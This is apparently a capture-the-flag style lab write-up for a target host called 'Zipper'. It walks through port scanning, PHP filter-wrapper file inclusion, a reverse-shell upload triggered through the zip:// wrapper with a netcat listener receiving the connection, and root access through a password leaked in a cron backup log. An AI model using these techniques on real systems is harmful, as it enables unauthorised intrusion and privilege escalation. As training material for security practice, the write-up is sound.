## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.181.229
# HOSTNAME                                  // Found post initial foothold
zipper
# OPERATING SYSTEM                          // Found post initial foothold
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.2 LTS"
NAME="Ubuntu"
VERSION="20.04.2 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.2 LTS"
VERSION_ID="20.04"

# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
```
# ENUMERATION
## PORT 80
```bash
sudo whatweb $url | sed 's/,/\n/g'

http://192.168.181.229 [200 OK] 
- Apache[2.4.41]
- Bootstrap[4.0.0]
- HTML5
- Title[Zipper]

- The page accepts files and compress it and lets us download on zip format

sudo curl -s $url| grep -oP 'href="\K[^"]+' | sort -u | less
http://192.168.181.229/index.php?file=home

- Tried all LFI not working 
- Trying using php wrappers - Worked
http://192.168.181.229/index.php?file=php://filter/read=convert.base64-encode/resource=home
- Decoding the base64
- Found upload.php

- Fuzzing 
sudo feroxbuster -w /usr/share/wordlists/dirb/common.txt -C 403,404 -o fuzz/feroxbuster-common.txt -t 20 -u $url/
200      GET        8l       26w      155c http://192.168.181.229/style.css
200      GET       76l      225w     3151c http://192.168.181.229/index.php
200      GET       76l      225w     3151c http://192.168.181.229/
200      GET        8l       26w      155c http://192.168.181.229/style
301      GET        9l       28w      320c http://192.168.181.229/uploads => http://192.168.181.229/uploads/

- Files to check
	- index
	- home
	- upload

- From upload.php
	- Found the file gets zipped and placed into uploads directory in file name format upload_. time()..zip
```
## INITIAL FOOTHOLD
```bash
- Googling php wrapper zip rce
	- Found php zip wrapper to rce
	- Reference - https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/

cp /usr/share/laudanum/php/php-reverse-shell.php ./shell.php
- edit lport and lhost
- Upload the shell.php
- the download zip file name contains the path 
uploads/upload_1733927286.zip

# RCE 
http://192.168.181.229/index.php?file=zip://uploads/upload_1733927286.zip%23shell

sudo nc -nvlp 80                         
listening on [any] 80 ...                                                                     
connect to [192.168.45.152] from (UNKNOWN) [192.168.181.229] 36922                            
Linux zipper 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 14:28:48 up  2:19,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                           
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## PRIVILEGE ESCALATION
```bash
www-data@zipper:/$ cat /etc/crontab 
* *     * * *   root    bash /opt/backup.sh

www-data@zipper:/$ cat /opt/backup.sh
#!/bin/bash
password=`cat /root/secret`
cd /var/www/html/uploads
rm *.tmp
7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.logwww-data@zipper:/$ 

cat /opt/backups/backup.log
- Found creds WildCardsGoingWild

su root
Password: WildCardsGoingWild

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Wed Dec 11 17:42:20 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.181.229
Nmap scan report for 192.168.181.229
Host is up, received reset ttl 61 (0.047s latency).
Scanned at 2024-12-11 17:42:22 IST for 24s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH6PH1/ST7TUJ4Mp/l4c7G+TM07YbX7YIsnHzq1TRpvtiBh8MQuFkL1SWW9+za+h6ZraqoZ0ewwkH+0la436t9Q+2H/Nh4CntJOrRbpLJKg4hChjgCHd5KiLCOKHhXPs/FA3mm0Zkzw1tVJLPR6RTbIkkbQiV2Zk3u8oamV5srWIJeYUY5O2XXmTnKENfrPXeHup1+3wBOkTO4Mu17wBSw6yvXyj+lleKjQ6Hnje7KozW5q4U6ijd3LmvHE34UHq/qUbCUbiwY06N2Mj0NQiZqWW8z48eTzGsuh6u1SfGIDnCCq3sWm37Y5LIUvqAFyIEJZVsC/UyrJDPBE+YIODNbN2QLD9JeBr8P4n1rkMaXbsHGywFtutdSrBZwYuRuB2W0GjIEWD/J7lxKIJ9UxRq0UxWWkZ8s3SNqUq2enfPwQt399nigtUerccskdyUD0oRKqVnhZCjEYfX3qOnlAqejr3Lpm8nA31pp6lrKNAmQEjdSO8Jxk04OR2JBxcfVNfs=
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0EdIHR7NOReMM0G7C8zxbLgwB3ump+nb2D3Pe3tXqp/6jNJ/GbU2e4Ab44njMKHJbm/PzrtYzojMjGDuBlQCg=
|   256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDCc0saExmeDXtqm5FS+D5RnDke8aJEvFq3DJIr0KZML
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Zipper
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 11 17:42:46 2024 -- 1 IP address (1 host up) scanned in 26.14 seconds

```

